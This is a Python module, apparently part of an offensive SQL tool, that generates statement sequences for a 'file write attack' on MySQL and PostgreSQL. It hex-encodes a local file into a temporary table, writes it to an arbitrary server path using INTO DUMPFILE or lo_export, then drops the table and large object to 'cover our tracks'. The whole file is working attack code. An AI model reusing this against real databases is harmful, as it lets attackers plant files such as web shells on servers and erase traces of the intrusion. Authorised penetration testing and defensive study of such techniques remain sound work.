import logging
import binascii
import base64
import random
import string

log = logging.getLogger(__name__)

class DatabaseException(Exception):
    pass

class Database(object):
    '''Abstract the SQL statements per database implementation.'''
    def __init__(self):
        pass

    def filewrite_sequence(self, db, pathfrom, pathto):
        if db == 'mysql':
            return self._filewrite_seq_mysql(pathfrom, pathto)
        elif db == 'postgres':
            return self._filewrite_seq_postgres(pathfrom, pathto)

        raise DatabaseException('file write attack only supported on mysql.')

    def _write_filedata(self, pathfrom, datatype='text', enc64=True):
        '''Take the given file and create a series of SQL statements that create a table
        and write the file data to it. If end64 is True, use base64 encoding, otherwise
        use hex encoding. datatype is the column datatype used for the table.
        Returns teh (random) table name and series of SQL statements.'''
        table = ''.join(random.choice(string.ascii_uppercase) for _ in range(16))
        statements = []
        statements.append('CREATE TABLE {} (data {})'.format(table, datatype))
        chunk_len = 1024
        with open(pathfrom, 'rb') as fd:
            chunk = fd.read(chunk_len)

            if enc64:
                data = base64.encodebytes(chunk).decode()     # the decode() decodes the python byte string.
            else:
                data = binascii.b2a_hex(chunk).decode()

            statements.append('INSERT INTO {} (data) VALUES(\'{}\')'.format(table, data))
            while chunk:
                chunk = fd.read(chunk_len)
                if chunk:
                    if enc64:
                        data = base64.encodebytes(chunk).decode()
                    else:
                        data = binascii.b2a_hex(chunk).decode()

                    statements.append('UPDATE {} SET data = data || \'{}\''.format(table, data))

        return table, statements

    def _filewrite_seq_mysql(self, pathfrom, pathto):
        # write file to a table
        table, statements = self._write_filedata(pathfrom, datatype='LONGBLOB', enc64=False)

        # now read it out of the database and into a file.
        # (We would use base64 here, but mysql 5.0 does not support native base64 decoding.)
        statements.append('SELECT UNHEX(data) FROM {} INTO DUMPFILE \'{}\''.format(table, pathto))

        # now cover our tracks.
        statements.append('DROP TABLE {}'.format(table))

        return statements

    def _filewrite_seq_postgres(self, pathfrom, pathto):
        # write file to a table
        table, statements = self._write_filedata(pathfrom, datatype='text', enc64=False)

        # now read it out of the database and into a file.
        loid = ''.join(random.choice(string.digits) for _ in range(6))
        statements.append('select lo_create({})'.format(loid)) 

        # we don't use set data as that is mucking with internal structure of LOs in the DB.
        # instead we use the lo_* functions directly and let postgres worry about the details.
        # It's possible that we could skip the step of writing the data to a temp table and just
        # use lo_write(), lo_open(), and lo_seek() in some combination. It's touch though as we
        # do not have direct access to the fd returned from lo_open. 
        #
        # magic number x'60000'::int is WRITE_INV|READ_INV for lo_open from postgres source. 
        statements.append('select lowrite(lo_open({}, x\'60000\'::int), '
                          'decode((select data from {}), \'hex\'))'.format(loid, table))

        # this breaks for data > 2048 bytes.
        # statements.append('update pg_largeobject set data = (decode((select data from {}),'
        statements.append('select lo_export({}, \'{}\')'.format(loid, pathto))

        # now cover our tracks.
        statements.append('select lo_unlink({})'.format(loid))
        statements.append('drop table {}'.format(table))

        return statements
